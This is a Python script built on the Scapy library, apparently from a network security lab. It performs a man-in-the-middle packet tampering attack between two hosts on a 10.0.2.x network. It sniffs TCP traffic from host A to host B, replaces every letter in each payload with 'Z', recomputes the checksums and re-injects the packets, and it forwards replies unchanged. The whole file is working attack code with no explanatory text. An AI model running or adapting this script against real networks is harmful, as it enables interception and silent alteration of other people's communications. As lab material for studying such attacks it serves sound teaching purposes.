#!/usr/bin/python3

from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether, ARP

A_IP='10.0.2.15'
A_MAC='08:00:27:e9:cd:6b'
B_IP='10.0.2.4'
B_MAC='08:00:27:af:c0:73'
M_IP='10.0.2.5'
M_MAC='08:00:27:de:41:03'

def spoof_pkt(pkt):
    if pkt[IP].src==A_IP and pkt[IP].dst==B_IP and pkt[TCP].payload:
        real= pkt[TCP].payload.load
        data=real.decode()
        s=re.sub(r'[a-zA-Z]',r'Z',data)
        newpkt=IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        newpkt=newpkt/s
        print("Data transformed from: "+str(real)+" to: "+s)
        send(newpkt, verbose=False)
    elif pkt[IP].src==B_IP and pkt[IP].dst==A_IP:
        newpkt=pkt[IP]
        send(newpkt, verbose=False)

pkt=sniff(filter='tcp',prn=spoof_pkt)
